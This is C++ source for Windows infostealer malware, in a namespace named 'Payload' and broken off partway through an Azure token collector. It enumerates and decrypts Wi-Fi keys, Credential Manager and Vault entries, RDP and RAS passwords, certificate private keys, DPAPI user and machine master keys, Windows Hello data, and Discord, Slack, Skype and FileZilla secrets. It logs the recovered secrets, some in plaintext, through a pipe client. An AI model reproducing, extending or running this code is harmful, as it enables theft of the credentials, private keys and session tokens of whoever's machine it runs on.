#include "extra_extractor.hpp"
#include <wlanapi.h>
#include <dpapi.h>
#include <shlobj.h>
#include <fstream>
#include <regex>
#include <sstream>
#include <filesystem>
#include <wincred.h>
#include <wincrypt.h>
#include <winreg.h>
#include <iomanip>      
#include <map>          
#include <sddl.h>       
#include <functional>   

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "ncrypt.lib")

namespace Payload {

    // =========================================================================
    // Helper functions (originally static in extra_extractor.cpp)
    // =========================================================================

    static std::string BytesToHex(const BYTE* data, size_t len) {
        std::ostringstream hex;
        hex << std::hex << std::setfill('0');
        for (size_t i = 0; i < len; ++i) {
            hex << std::setw(2) << static_cast<int>(data[i]);
        }
        return hex.str();
    }

    static std::string BytesToHex(const std::string& str) {
        return BytesToHex(reinterpret_cast<const BYTE*>(str.data()), str.size());
    }

    static std::string BytesToBase64(const BYTE* data, DWORD len) {
        DWORD base64Len = 0;
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            nullptr, &base64Len)) {
            return "";
        }
        std::string out(base64Len, 0);
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            &out[0], &base64Len)) {
            return "";
        }
        if (!out.empty() && out.back() == '\0') out.pop_back();
        return out;
    }

    static std::string DERToPEM(const BYTE* der, DWORD derLen, const char* header) {
        std::string b64 = BytesToBase64(der, derLen);
        if (b64.empty()) return "";
        std::ostringstream pem;
        pem << "-----BEGIN " << header << "-----\n";
        for (size_t i = 0; i < b64.size(); i += 64) {
            pem << b64.substr(i, 64) << "\n";
        }
        pem << "-----END " << header << "-----\n";
        return pem.str();
    }

    static std::string X509ToPEM(const BYTE* der, DWORD derLen) {
        return DERToPEM(der, derLen, "CERTIFICATE");
    }

    static std::string BlobToHex(const CRYPT_INTEGER_BLOB& blob) {
        return BytesToHex(blob.pbData, blob.cbData);
    }

    static std::string WCharToUtf8(const WCHAR* wstr) {
        if (!wstr) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
        if (size <= 0) return "";
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &result[0], size, nullptr, nullptr);
        return result;
    }

    static std::string DPAPIDecrypt(const std::vector<BYTE>& blob,
        const std::vector<BYTE>& entropy = {}) {
        DATA_BLOB in = { static_cast<DWORD>(blob.size()), const_cast<BYTE*>(blob.data()) };
        DATA_BLOB ent = { 0, nullptr };
        if (!entropy.empty()) {
            ent.pbData = const_cast<BYTE*>(entropy.data());
            ent.cbData = static_cast<DWORD>(entropy.size());
        }
        DATA_BLOB out = { 0, nullptr };
        if (CryptUnprotectData(&in, nullptr,
            entropy.empty() ? nullptr : &ent,
            nullptr, nullptr, 0, &out)) {
            std::string result(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return result;
        }
        if (CryptUnprotectData(&in, nullptr,
            entropy.empty() ? nullptr : &ent,
            nullptr, nullptr,
            CRYPTPROTECT_LOCAL_MACHINE, &out)) {
            std::string result(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return result;
        }
        return "[DPAPI_FAILED]";
    }

    static std::vector<BYTE> Base64Decode(const std::string& input) {
        DWORD len = 0;
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr))
            return {};
        std::vector<BYTE> out(len);
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &len, nullptr, nullptr))
            return {};
        return out;
    }

    static std::string CertNameToString(PCERT_NAME_BLOB nameBlob) {
        char buf[256] = { 0 };
        CertNameToStrA(X509_ASN_ENCODING, nameBlob, CERT_SIMPLE_NAME_STR, buf, sizeof(buf));
        return std::string(buf);
    }

    static std::string ExportPrivateKeyAsPEM(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey, DWORD dwSpec, BOOL bCallerFree) {
        if (dwSpec == CERT_NCRYPT_KEY_SPEC) {
            NCRYPT_HANDLE hNCrypt = (NCRYPT_HANDLE)hKey;
            DWORD blobLen = 0;
            SECURITY_STATUS status = NCryptExportKey(hNCrypt, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                nullptr, nullptr, 0, &blobLen, 0);
            if (status == ERROR_SUCCESS && blobLen > 0) {
                std::vector<BYTE> blob(blobLen);
                status = NCryptExportKey(hNCrypt, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                    nullptr, blob.data(), blobLen, &blobLen, 0);
                if (status == ERROR_SUCCESS) {
                    return DERToPEM(blob.data(), blobLen, "PRIVATE KEY");
                }
            }
            return "[CNG export failed]";
        }
        else {
            HCRYPTPROV hProv = (HCRYPTPROV)hKey;
            DWORD blobLen = 0;
            if (CryptExportKey(hProv, 0, PRIVATEKEYBLOB, 0, nullptr, &blobLen)) {
                std::vector<BYTE> blob(blobLen);
                if (CryptExportKey(hProv, 0, PRIVATEKEYBLOB, 0, blob.data(), &blobLen)) {
                    return BytesToHex(blob.data(), blob.size());
                }
            }
            return "[CSP export failed]";
        }
    }

    static void ProcessDirectoryForDPAPIBlobs(const std::filesystem::path& dir,
        const std::string& logPrefix,
        std::function<void(const std::filesystem::path&, const std::string&)> onSuccess) {
        if (!std::filesystem::exists(dir)) return;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(dir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path(), std::ios::binary);
                if (!f) continue;
                std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)),
                    std::istreambuf_iterator<char>());
                std::string decrypted = DPAPIDecrypt(blob);
                if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty()) {
                    onSuccess(entry.path(), decrypted);
                }
            }
        }
        catch (...) {}
    }

    static std::string GetUserSid() {
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return "";
        DWORD len = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &len);
        if (len == 0) { CloseHandle(hToken); return ""; }
        std::vector<BYTE> buf(len);
        auto pUser = reinterpret_cast<TOKEN_USER*>(buf.data());
        if (!GetTokenInformation(hToken, TokenUser, pUser, len, &len)) {
            CloseHandle(hToken);
            return "";
        }
        CloseHandle(hToken);
        LPWSTR strSid = nullptr;
        if (!ConvertSidToStringSidW(pUser->User.Sid, &strSid))
            return "";
        std::string sid = WCharToUtf8(strSid);
        LocalFree(strSid);
        return sid;
    }

    // =========================================================================
    // ExtraExtractor implementation
    // =========================================================================

    ExtraExtractor::ExtraExtractor(PipeClient& pipe) : m_pipe(pipe) {}

    void ExtraExtractor::AddSecret(const std::string& topic, const std::string& path,
        const std::vector<uint8_t>& enc,
        const std::string& dpapiKeyBase64) {
        ExtraSecret sec;
        sec.topic = topic;
        sec.path = path;
        sec.encrypted_data = enc;
        sec.related_dpapi = dpapiKeyBase64;
        sec.related_abe = "";  // never ABE protected
        m_secrets.push_back(sec);
    }

    // -------------------------------------------------------------------------
    // CollectWiFi
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectWiFi() {
        HANDLE wlan = nullptr;
        DWORD version;
        if (WlanOpenHandle(2, nullptr, &version, &wlan) != ERROR_SUCCESS) return;
        PWLAN_INTERFACE_INFO_LIST ifList = nullptr;
        if (WlanEnumInterfaces(wlan, nullptr, &ifList) == ERROR_SUCCESS) {
            for (DWORD i = 0; i < ifList->dwNumberOfItems; ++i) {
                PWLAN_PROFILE_INFO_LIST profList = nullptr;
                if (WlanGetProfileList(wlan, &ifList->InterfaceInfo[i].InterfaceGuid,
                    nullptr, &profList) == ERROR_SUCCESS) {
                    for (DWORD j = 0; j < profList->dwNumberOfItems; ++j) {
                        LPWSTR xml = nullptr;
                        DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                        if (WlanGetProfile(wlan, &ifList->InterfaceInfo[i].InterfaceGuid,
                            profList->ProfileInfo[j].strProfileName, nullptr,
                            &xml, &flags, nullptr) == ERROR_SUCCESS && xml) {
                            std::string xmlStr = WCharToUtf8(xml);
                            std::string password;
                            std::regex keyRe("<keyMaterial>([\\s\\S]*?)</keyMaterial>");
                            std::smatch match;
                            if (std::regex_search(xmlStr, match, keyRe) && match.size() > 1)
                                password = match[1].str();
                            else
                                password = "[open or no key]";
                            std::string ssid = WCharToUtf8(profList->ProfileInfo[j].strProfileName);
                            AddSecret("WiFi", ssid, {}, "");
                            m_pipe.LogDebug("WiFi plaintext: " + ssid + " -> " + password);
                            WlanFreeMemory(xml);
                        }
                    }
                    WlanFreeMemory(profList);
                }
            }
            WlanFreeMemory(ifList);
        }
        WlanCloseHandle(wlan, nullptr);
    }

    // -------------------------------------------------------------------------
    // CollectDPAPICredentials
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectDPAPICredentials() {
        DWORD count = 0;
        PCREDENTIALW* creds = nullptr;
        if (!CredEnumerateW(nullptr, 0, &count, &creds)) return;
        for (DWORD i = 0; i < count; ++i) {
            std::string target = WCharToUtf8(creds[i]->TargetName);
            std::vector<uint8_t> encryptedBlob(
                creds[i]->CredentialBlob,
                creds[i]->CredentialBlob + creds[i]->CredentialBlobSize);
            std::string usedKeyBase64;
            DATA_BLOB in = { static_cast<DWORD>(encryptedBlob.size()), encryptedBlob.data() };
            DATA_BLOB out = { 0, nullptr };
            if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                usedKeyBase64 = m_userMasterKeyBase64;
                LocalFree(out.pbData);
            }
            else if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr,
                CRYPTPROTECT_LOCAL_MACHINE, &out)) {
                usedKeyBase64 = m_machineMasterKeyBase64;
                LocalFree(out.pbData);
            }
            AddSecret("DPAPI_Credential", target, encryptedBlob, usedKeyBase64);
        }
        CredFree(creds);
    }

    // -------------------------------------------------------------------------
    // CollectVault (simplified: stores plaintext, no encrypted blob)
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectVault() {
        HMODULE hVaultDll = LoadLibraryW(L"vaultcli.dll");
        if (!hVaultDll) return;
        using VaultEnumerateVaults_t = DWORD(WINAPI*)(DWORD, PDWORD, GUID*);
        using VaultOpenVault_t = DWORD(WINAPI*)(GUID*, DWORD, HANDLE*);
        using VaultEnumerateItems_t = DWORD(WINAPI*)(HANDLE, DWORD, PDWORD, PVOID*);
        using VaultCloseVault_t = DWORD(WINAPI*)(HANDLE*);
        using VaultFree_t = DWORD(WINAPI*)(PVOID);
        auto pVaultEnumerateVaults = (VaultEnumerateVaults_t)GetProcAddress(hVaultDll, "VaultEnumerateVaults");
        auto pVaultOpenVault = (VaultOpenVault_t)GetProcAddress(hVaultDll, "VaultOpenVault");
        auto pVaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(hVaultDll, "VaultEnumerateItems");
        auto pVaultCloseVault = (VaultCloseVault_t)GetProcAddress(hVaultDll, "VaultCloseVault");
        auto pVaultFree = (VaultFree_t)GetProcAddress(hVaultDll, "VaultFree");
        if (!pVaultEnumerateVaults || !pVaultOpenVault || !pVaultEnumerateItems ||
            !pVaultCloseVault || !pVaultFree) {
            FreeLibrary(hVaultDll);
            return;
        }
        DWORD vaultCount = 0;
        GUID vaults[32];
        if (pVaultEnumerateVaults(0, &vaultCount, vaults) != ERROR_SUCCESS) {
            FreeLibrary(hVaultDll);
            return;
        }
        bool hasWindowsVault = false;
        for (DWORD i = 0; i < vaultCount && !hasWindowsVault; ++i) {
            static const GUID WINDOWS_VAULT = { 0x4BF4C3D5, 0x4945, 0x473F,
                                              {0x8B,0x6F,0x7B,0x7F,0x6F,0x8D,0x3C,0x6E} };
            if (IsEqualGUID(vaults[i], WINDOWS_VAULT)) hasWindowsVault = true;
        }
        if (!hasWindowsVault && vaultCount < 32) {
            const GUID WINDOWS_VAULT = { 0x4BF4C3D5, 0x4945, 0x473F,
                                        {0x8B,0x6F,0x7B,0x7F,0x6F,0x8D,0x3C,0x6E} };
            vaults[vaultCount++] = WINDOWS_VAULT;
        }
        for (DWORD i = 0; i < vaultCount; ++i) {
            HANDLE hVault = NULL;
            if (pVaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) continue;
            DWORD itemCount = 0;
            PVOID itemBuffer = nullptr;
            if (pVaultEnumerateItems(hVault, 0, &itemCount, &itemBuffer) == ERROR_SUCCESS) {
                struct VAULT_ITEM_WIN8 {
                    GUID SchemaId;
                    PWSTR pszCredentialFriendlyName;
                    PVOID pResource;
                    PVOID pIdentity;
                    PVOID pAuthenticator;
                    PVOID pPackageSid;
                    FILETIME LastModified;
                    DWORD dwFlags;
                    DWORD dwPropertiesCount;
                    PVOID pProperties;
                };
                auto items = static_cast<VAULT_ITEM_WIN8*>(itemBuffer);
                for (DWORD j = 0; j < itemCount; ++j) {
                    std::string resource = WCharToUtf8(
                        items[j].pResource ? *reinterpret_cast<WCHAR**>(items[j].pResource) : L"");
                    std::string password;
                    if (items[j].pAuthenticator) {
                        WCHAR* authStr = reinterpret_cast<WCHAR*>(items[j].pAuthenticator);
                        password = WCharToUtf8(authStr);
                    }
                    AddSecret("Vault", resource, {}, "");
                    m_pipe.LogDebug("Vault: " + resource + " -> " + password);
                }
                pVaultFree(itemBuffer);
            }
            pVaultCloseVault(&hVault);
        }
        FreeLibrary(hVaultDll);
    }

    // -------------------------------------------------------------------------
    // CollectRAS
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectRAS() {
        auto searchDir = [&](const std::string& pbkPath) {
            if (!std::filesystem::exists(pbkPath)) return;
            std::ifstream f(pbkPath);
            if (!f) return;
            std::string line, currentEntry;
            std::regex pwdRegex(R"(Password2=([0-9a-fA-F]+))");
            while (std::getline(f, line)) {
                if (line.empty()) continue;
                if (line[0] == '[') {
                    currentEntry = line;
                }
                else if (std::regex_search(line, pwdRegex)) {
                    std::smatch m;
                    std::regex_search(line, m, pwdRegex);
                    std::string hex = m[1].str();
                    std::vector<uint8_t> blob;
                    for (size_t i = 0; i < hex.length(); i += 2)
                        blob.push_back(static_cast<BYTE>(
                            std::strtoul(hex.substr(i, 2).c_str(), nullptr, 16)));
                    std::string usedKeyBase64;
                    DATA_BLOB in = { static_cast<DWORD>(blob.size()), blob.data() };
                    DATA_BLOB out = { 0, nullptr };
                    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                        usedKeyBase64 = m_userMasterKeyBase64;
                        LocalFree(out.pbData);
                    }
                    else if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr,
                        CRYPTPROTECT_LOCAL_MACHINE, &out)) {
                        usedKeyBase64 = m_machineMasterKeyBase64;
                        LocalFree(out.pbData);
                    }
                    AddSecret("RAS", currentEntry, blob, usedKeyBase64);
                }
            }
            };
        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            searchDir(std::string(appdata) + "\\Microsoft\\Network\\Connections\\Pbk\\rasphone.pbk");
        }
        char programdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, programdata))) {
            searchDir(std::string(programdata) + "\\Microsoft\\Network\\Connections\\Pbk\\rasphone.pbk");
        }
    }

    // -------------------------------------------------------------------------
    // CollectPrivateKeys
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectPrivateKeys() {
        HCERTSTORE hMy = CertOpenSystemStoreA(0, "MY");
        if (hMy) {
            PCCERT_CONTEXT pCert = nullptr;
            while ((pCert = CertEnumCertificatesInStore(hMy, pCert)) != nullptr) {
                std::string certPem = X509ToPEM(pCert->pbCertEncoded, pCert->cbCertEncoded);
                std::string serialHex = BlobToHex(pCert->pCertInfo->SerialNumber);
                std::string subject = CertNameToString(&pCert->pCertInfo->Subject);
                HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey = 0;
                DWORD dwKeySpec = 0;
                BOOL bCallerFree = FALSE;
                if (CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_SILENT_FLAG,
                    nullptr, &hKey, &dwKeySpec, &bCallerFree)) {
                    std::string keyPem = ExportPrivateKeyAsPEM(hKey, dwKeySpec, bCallerFree);
                    std::vector<uint8_t> keyData(keyPem.begin(), keyPem.end());
                    AddSecret("PrivateKey", subject + " (" + serialHex + ")", keyData, "");
                    if (bCallerFree) {
                        if (dwKeySpec == CERT_NCRYPT_KEY_SPEC)
                            NCryptFreeObject((NCRYPT_HANDLE)hKey);
                        else
                            CryptReleaseContext((HCRYPTPROV)hKey, 0);
                    }
                }
                else {
                    AddSecret("Certificate", subject + " (" + serialHex + ")", {}, "");
                }
            }
            CertCloseStore(hMy, 0);
        }
        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            std::string cryptoRSA = std::string(appdata) + "\\Microsoft\\Crypto\\RSA";
            if (std::filesystem::exists(cryptoRSA)) {
                for (auto& sidDir : std::filesystem::directory_iterator(cryptoRSA)) {
                    for (auto& keyFile : std::filesystem::recursive_directory_iterator(sidDir.path())) {
                        if (!keyFile.is_regular_file()) continue;
                        std::ifstream f(keyFile.path(), std::ios::binary);
                        std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)), {});
                        if (blob.size() < 12) continue;
                        DWORD cbEncrypted = *reinterpret_cast<DWORD*>(blob.data() + 8);
                        if (12 + cbEncrypted > blob.size()) continue;
                        std::vector<BYTE> dpapiBlob(blob.begin() + 12, blob.begin() + 12 + cbEncrypted);
                        std::string usedKeyBase64;
                        DATA_BLOB in = { static_cast<DWORD>(dpapiBlob.size()), dpapiBlob.data() };
                        DATA_BLOB out = { 0, nullptr };
                        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                            usedKeyBase64 = m_userMasterKeyBase64;
                            LocalFree(out.pbData);
                        }
                        else if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr,
                            CRYPTPROTECT_LOCAL_MACHINE, &out)) {
                            usedKeyBase64 = m_machineMasterKeyBase64;
                            LocalFree(out.pbData);
                        }
                        AddSecret("RSA_Key", keyFile.path().string(), dpapiBlob, usedKeyBase64);
                    }
                }
            }
        }
    }

    // -------------------------------------------------------------------------
    // CollectLegacyApps
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectLegacyApps() {
        char appdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) return;
        std::string appdat = appdata;
        // Discord
        std::string discordDir = appdat + "\\discord\\Local Storage\\leveldb";
        if (std::filesystem::exists(discordDir)) {
            for (auto& entry : std::filesystem::directory_iterator(discordDir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path());
                std::string content((std::istreambuf_iterator<char>(f)), {});
                std::regex tokenR(R"([\"'](mfa\.[a-zA-Z0-9_-]+|ND[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)[\"'])");
                std::smatch m;
                if (std::regex_search(content, m, tokenR)) {
                    AddSecret("Discord", entry.path().string(), {}, "");
                    m_pipe.LogDebug("Discord token: " + m[1].str());
                }
            }
        }
        // Slack
        std::string slackDir = appdat + "\\Slack\\Local Storage\\leveldb";
        if (std::filesystem::exists(slackDir)) {
            for (auto& entry : std::filesystem::directory_iterator(slackDir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path());
                std::string content((std::istreambuf_iterator<char>(f)), {});
                std::regex tokenR(R"((xox[a-zA-Z]-[0-9a-zA-Z-]+))");
                std::smatch m;
                if (std::regex_search(content, m, tokenR)) {
                    AddSecret("Slack", entry.path().string(), {}, "");
                    m_pipe.LogDebug("Slack token: " + m[1].str());
                }
            }
        }
        // FileZilla
        std::string fz = appdat + "\\FileZilla\\sitemanager.xml";
        if (std::filesystem::exists(fz)) {
            std::ifstream f(fz);
            std::string content((std::istreambuf_iterator<char>(f)), {});
            std::regex passR(R"(<Pass>([^<]+)</Pass>)");
            std::smatch m;
            if (std::regex_search(content, m, passR)) {
                std::string encoded = m[1].str();
                auto decoded = Base64Decode(encoded);
                std::vector<uint8_t> encryptedData(encoded.begin(), encoded.end());
                AddSecret("FileZilla", "sitemanager.xml", encryptedData, "");
                m_pipe.LogDebug("FileZilla password: " + (decoded.empty() ? encoded : std::string(decoded.begin(), decoded.end())));
            }
        }
        // Skype
        std::string skype = appdat + "\\Skype\\config.xml";
        if (std::filesystem::exists(skype)) {
            std::ifstream f(skype);
            std::string content((std::istreambuf_iterator<char>(f)), {});
            std::regex tokenR(R"(<Token>([^<]+)</Token>)");
            std::smatch m;
            if (std::regex_search(content, m, tokenR)) {
                AddSecret("Skype", "config.xml", {}, "");
                m_pipe.LogDebug("Skype token: " + m[1].str());
            }
        }
    }

    // -------------------------------------------------------------------------
    // CollectRDPHistory
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectRDPHistory() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Terminal Server Client\\Servers",
            0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Terminal Server Client\\Servers",
                0, KEY_READ | KEY_WOW64_32KEY, &hKey) != ERROR_SUCCESS) {
                return;
            }
        }
        DWORD index = 0;
        char serverName[256];
        DWORD nameLen = sizeof(serverName);
        while (RegEnumKeyExA(hKey, index++, serverName, &nameLen,
            nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            std::string server = serverName;
            std::string username;
            HKEY hSubKey;
            if (RegOpenKeyExA(hKey, serverName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                char uname[256] = { 0 };
                DWORD size = sizeof(uname);
                if (RegQueryValueExA(hSubKey, "UsernameHint", nullptr, nullptr,
                    reinterpret_cast<LPBYTE>(uname), &size) == ERROR_SUCCESS) {
                    username = uname;
                }
                RegCloseKey(hSubKey);
            }
            std::wstring target = L"TERMSRV/" + std::wstring(serverName, serverName + strlen(serverName));
            PCREDENTIALW cred = nullptr;
            std::vector<uint8_t> encryptedBlob;
            std::string usedKeyBase64;
            if (CredReadW(target.c_str(), CRED_TYPE_DOMAIN_PASSWORD, 0, &cred) == TRUE) {
                if (cred->CredentialBlobSize > 0) {
                    encryptedBlob.assign(cred->CredentialBlob,
                        cred->CredentialBlob + cred->CredentialBlobSize);
                    DATA_BLOB in = { static_cast<DWORD>(encryptedBlob.size()), encryptedBlob.data() };
                    DATA_BLOB out = { 0, nullptr };
                    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                        usedKeyBase64 = m_userMasterKeyBase64;
                        LocalFree(out.pbData);
                    }
                    else if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr,
                        CRYPTPROTECT_LOCAL_MACHINE, &out)) {
                        usedKeyBase64 = m_machineMasterKeyBase64;
                        LocalFree(out.pbData);
                    }
                }
                CredFree(cred);
            }
            AddSecret("RDP_History", server + "/" + username, encryptedBlob, usedKeyBase64);
            nameLen = sizeof(serverName);
        }
        RegCloseKey(hKey);
    }

    // -------------------------------------------------------------------------
    // CollectRDPFiles
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectRDPFiles() {
        char userProfile[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) return;
        std::string docs = std::string(userProfile) + "\\Documents";
        if (!std::filesystem::exists(docs)) return;
        for (auto& entry : std::filesystem::recursive_directory_iterator(docs)) {
            if (!entry.is_regular_file()) continue;
            if (entry.path().extension() != ".rdp") continue;
            std::ifstream f(entry.path());
            if (!f) continue;
            std::string line;
            while (std::getline(f, line)) {
                const std::string marker = "password 51:b:";
                auto pos = line.find(marker);
                if (pos != std::string::npos) {
                    std::string b64 = line.substr(pos + marker.length());
                    auto blob = Base64Decode(b64);
                    if (!blob.empty()) {
                        std::string usedKeyBase64;
                        DATA_BLOB in = { static_cast<DWORD>(blob.size()), blob.data() };
                        DATA_BLOB out = { 0, nullptr };
                        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                            usedKeyBase64 = m_userMasterKeyBase64;
                            LocalFree(out.pbData);
                        }
                        else if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr,
                            CRYPTPROTECT_LOCAL_MACHINE, &out)) {
                            usedKeyBase64 = m_machineMasterKeyBase64;
                            LocalFree(out.pbData);
                        }
                        AddSecret("RDP_File", entry.path().string(), blob, usedKeyBase64);
                    }
                }
            }
        }
    }

    // -------------------------------------------------------------------------
    // CollectOutgoingRDP (calls CollectRDPHistory again)
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectOutgoingRDP() {
        CollectRDPHistory(); // already handles credentials
    }

    // -------------------------------------------------------------------------
    // CollectUserMasterKeys
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectUserMasterKeys() {
        std::string userSid = GetUserSid();
        if (userSid.empty()) {
            m_pipe.Log("NO_USER_MASTER_KEYS");
            return;
        }
        std::filesystem::path protectDir;
        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            protectDir = std::filesystem::path(appdata) / "Microsoft" / "Protect" / userSid;
        }
        if (protectDir.empty() || !std::filesystem::exists(protectDir)) {
            m_pipe.Log("NO_USER_MASTER_KEYS");
            return;
        }
        ProcessDirectoryForDPAPIBlobs(protectDir, "USER_MASTER_KEY",
            [&](const std::filesystem::path& filePath, const std::string& decrypted) {
                std::string guid = filePath.filename().string();
                std::vector<uint8_t> keyData(decrypted.begin(), decrypted.end());
                m_userMasterKeyBase64 = BytesToBase64(keyData.data(), static_cast<DWORD>(keyData.size()));
                std::ifstream f(filePath, std::ios::binary);
                std::vector<uint8_t> encryptedBlob((std::istreambuf_iterator<char>(f)), {});
                AddSecret("UserMasterKey", guid, encryptedBlob, "");
            });
        if (m_userMasterKeyBase64.empty())
            m_pipe.Log("NO_USER_MASTER_KEYS");
    }

    // -------------------------------------------------------------------------
    // CollectMachineMasterKeys
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectMachineMasterKeys() {
        char programdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, programdata))) {
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
            return;
        }
        std::filesystem::path machineDir = std::filesystem::path(programdata) / "Microsoft" / "Protect" / "S-1-5-18";
        if (!std::filesystem::exists(machineDir)) {
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
            return;
        }
        ProcessDirectoryForDPAPIBlobs(machineDir, "MACHINE_MASTER_KEY",
            [&](const std::filesystem::path& filePath, const std::string& decrypted) {
                std::string guid = filePath.filename().string();
                std::vector<uint8_t> keyData(decrypted.begin(), decrypted.end());
                m_machineMasterKeyBase64 = BytesToBase64(keyData.data(), static_cast<DWORD>(keyData.size()));
                std::ifstream f(filePath, std::ios::binary);
                std::vector<uint8_t> encryptedBlob((std::istreambuf_iterator<char>(f)), {});
                AddSecret("MachineMasterKey", guid, encryptedBlob, "");
            });
        if (m_machineMasterKeyBase64.empty())
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
    }

    // -------------------------------------------------------------------------
    // CollectWindowsHello
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectWindowsHello() {
        bool anyFound = false;
        auto processNgcDir = [&](const std::filesystem::path& ngcDir) {
            if (!std::filesystem::exists(ngcDir)) return;
            for (const auto& entry : std::filesystem::recursive_directory_iterator(
                ngcDir, std::filesystem::directory_options::skip_permission_denied)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path(), std::ios::binary);
                if (!f) continue;
                std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)), {});
                std::string decrypted = DPAPIDecrypt(blob);
                if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty()) {
                    std::string filePathStr = entry.path().string();
                    AddSecret("WindowsHello", filePathStr, blob, "");
                    anyFound = true;
                }
            }
            };
        char localAppData[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData))) {
            processNgcDir(std::filesystem::path(localAppData) / "Microsoft" / "Ngc");
        }
        processNgcDir(R"(C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc)");
        if (!anyFound) {
            m_pipe.Log("NO_WINDOWS_HELLO");
        }
    }

    // -------------------------------------------------------------------------
    // CollectAzureTokens
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectAzureTokens() {
        bool anyFound = false;
        char localAppData[MAX_PATH] = {};
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData))) {
            m_pipe.Log("NO_AZURE_TOKENS");
            return;
        }
        std::filesystem::path tokenDir = std::filesystem::path(localAppData) / "Microsoft" / "TokenBroker" / "Accounts";
        if (!std::filesystem::exists(tokenDir)) {
            m_pipe.Log("NO_AZURE_TOKENS");
            return;
        }
        for (const auto& accountDir : std::filesystem::directory_iterator(tokenDir)) {
            if (!accountDir.is_directory()) continue;
            for (const auto& file : std::filesystem::directory_iterator(accountDir)) {
                if (!file.is_regular_file()) continue;
                std::ifstream f(file.path(), std::ios::binary);
                if (!f) continue;
